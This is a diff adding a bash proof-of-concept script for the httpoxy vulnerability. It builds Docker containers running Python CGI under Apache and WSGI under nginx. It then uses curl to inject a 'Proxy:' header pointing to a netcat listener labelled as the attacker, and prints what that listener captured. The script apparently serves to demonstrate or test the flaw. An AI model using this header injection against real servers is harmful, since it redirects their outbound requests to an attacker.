@@ -1,0 +1,122 @@
+#!/usr/bin/env bash
+
+# as in, the address that docker exposes ports on
+if [ -z $DOCKER_IP ]; then
+    DOCKER_IP=127.0.0.1
+fi
+
+# as in, the address of the host from within the docker containers on the default bridge network
+if [ -z $DOCKER_HOST_IP ]; then
+    DOCKER_HOST_IP=172.17.0.1
+fi
+
+CONTAINER_CGI=python-httpoxy-cgi
+CONTAINER_WSGI=python-httpoxy-wsgi
+
+IMAGE_CGI=python-httpoxy-poc-cgi:latest
+IMAGE_WSGI=python-httpoxy-poc-wsgi:latest
+
+MALLORY_LISTENER_PORT=12345
+
+if [ -z $TEST_PORT_CGI ]; then
+    TEST_PORT_CGI=2081
+fi
+
+if [ -z $TEST_PORT_WSGI ]; then
+    TEST_PORT_WSGI=2083
+fi
+
+echo "Building docker container for cgi"
+docker build -f cgi.dockerfile -t $IMAGE_CGI . &
+
+echo "Building docker container for wsgi"
+docker build -f wsgi.dockerfile -t $IMAGE_WSGI . &
+
+wait
+
+echo "Stopping any previous docker containers"
+docker stop $CONTAINER_CGI  2>/dev/null || true
+docker kill $CONTAINER_CGI  2>/dev/null || true
+docker rm   $CONTAINER_CGI  2>/dev/null || true
+docker stop $CONTAINER_WSGI 2>/dev/null || true
+docker kill $CONTAINER_WSGI 2>/dev/null || true
+docker rm   $CONTAINER_WSGI 2>/dev/null || true
+
+echo "Starting docker container for cgi"
+docker run -d \
+    --name $CONTAINER_CGI \
+    -p $TEST_PORT_CGI:80 \
+    $IMAGE_CGI
+
+echo "Starting docker container for wsgi"
+docker run -d \
+    --name $CONTAINER_WSGI \
+    -p $TEST_PORT_WSGI:80 \
+    $IMAGE_WSGI
+
+echo "Wait a sec for them to dwell"
+sleep 3
+
+echo "Then start the tests"
+
+echo
+echo
+
+echo "---------------------------------------------------------------------------------"
+echo "Testing: cgi/apache..."
+
+echo "" > ./cgi-mallory.log
+nc -v -l 12345 > ./cgi-mallory.log 2>&1 &
+sleep 2
+curl -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/server.cgi > ./cgi-curl.log 2>&1
+pkill -f 'nc -v -l 12345'
+echo "Testing done."
+
+echo
+echo
+echo "Here's the curl output from the curl client"
+cat ./cgi-curl.log
+
+echo
+echo
+echo "Tests finished. Result time..."
+echo "Here is the output from the cgi program and apache logs:"
+docker exec $CONTAINER_CGI tail /var/log/apache2/*.log
+
+echo
+echo
+echo "And here is what the attacker got (any output other than a listening line here means trouble)"
+cat ./cgi-mallory.log
+echo "end of trouble"
+echo "---------------------------------------------------------------------------------"
+
+echo
+echo
+
+echo "---------------------------------------------------------------------------------"
+echo "Testing: wsgi/nginx"
+
+echo "" > ./wsgi-mallory.log
+nc -v -l 12345 > ./wsgi-mallory.log 2>&1 &
+sleep 2
+curl -vv -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_WSGI/ > ./wsgi-curl.log 2>&1
+pkill -f 'nc -v -l 12345'
+echo "Testing done."
+
+echo
+echo
+echo "Here's the curl output from the curl client"
+cat ./wsgi-curl.log
+
+echo
+echo
+echo "Tests finished. Result time..."
+echo "Here is the nginx logs (containing output from the wsgi program)"
+docker logs $CONTAINER_WSGI
+
+echo
+echo
+echo "And here is what the attacker got (any output other than a listening line here means trouble)"
+cat ./wsgi-mallory.log
+echo "end of trouble"
+echo "---------------------------------------------------------------------------------"
